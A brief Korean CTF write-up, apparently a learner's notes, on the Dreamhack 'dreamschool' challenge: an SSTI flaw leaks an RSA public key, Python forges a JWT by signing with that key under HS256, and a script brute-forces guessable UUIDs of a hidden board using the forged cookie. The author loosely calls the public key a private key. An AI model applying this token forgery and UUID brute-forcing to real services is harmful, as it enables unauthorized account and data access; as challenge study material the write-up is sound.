저번보다 놀라울 정도로 이해가 나아졌음에 정말 감사할 뿐이다 
사실 dreamschool은 개인적으로 dream storage보다 어렵게 다가왔으므로 
솔직히 이해가 쉽지 않으리라고 여겨졌다 
근데 오늘 다시 보면서 느낀 건 충분히 할 만하다는 사실이었다. 
일단 ssti취약점이 있다는 것은 기억하고 있었다 
공식 풀이로는 jinja2의 render_template_string 함수를 사용해서 ssti취약점 가능성이 있다는 것을 추리할 수 있다
고 한다 어쨋든 그렇게 pub key를 구할 수 있게 되는데 
이는 

import jwt
import datetime

pub_key = b'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6eagXQyAgUyVHWJ/VvnUmB2W5\n0a85CIbKcKFKK6EL7oGjIhEUGVlhxc3N+YK9mvvd7oQpqlktMaM4CYHIXQqv51Og\nmuiLtEy5YVF+M+y1Rc9UjMivzE/V7T/VRzFqbWQfy2XcCSVYyaKuHSgUk6YygEkA\nvC6SpGs8qW5NvHUW6QIDAQAB\n-----END PUBLIC KEY-----'
token = jwt.encode({
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=10),
    "username": "config",
    "school": "드림대학교"
}, key=pub_key, algorithm="HS256").decode()
print(token)

이런 식으로 개인키로 만들 수 있다 
이렇게 하면 개인키는 구했다 
그 다음에 uuid를 잘 보면 매우 유사하다는 것을 알 수 있다. 
심지어 url에 /드림대학교라고 치면 들어갈 수 있게 되어있다 
이를 통해 비밀 게시판의 uuid를 유추해내면 충분히 개인키를 이용하여 들어갈 수 있음을 알 수 있다 

import requests

headers = { 'cookie': f'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDQ1NTU4NjEsImV4cCI6MTY0NDU5MTg2MSwidXNlcm5hbWUiOiJjb25maWciLCJzY2hvb2wiOiJcdWI0ZGNcdWI5YmNcdWIzMDBcdWQ1NTlcdWFkNTAifQ.KKkMni7UTaZ29PLoiW7fuToSCkz1rsKYxLh7xHB2YOI'}
url_base = 'http://host1.dreamhack.games:9877/s/드림대학교/fca82'

n = int('12a', 16)
for uid in range(n+100, n+400):
    url = f'{url_base}{hex(uid)[2:]}-8af5-11ec-af0d-aafc00002501'
    res = requests.get(url, headers=headers)
    print(url)
    if '게시판' in res.text:
        print(res.text)
        break

대략 이런 식으로 브루트 포싱을 해주면 된다 (참고용이다) 
구체적인 값은 다 다르기 때문에 그걸 잘 조정해서 값을 잘 넣어서 브루트 포싱을 해주면 된다 
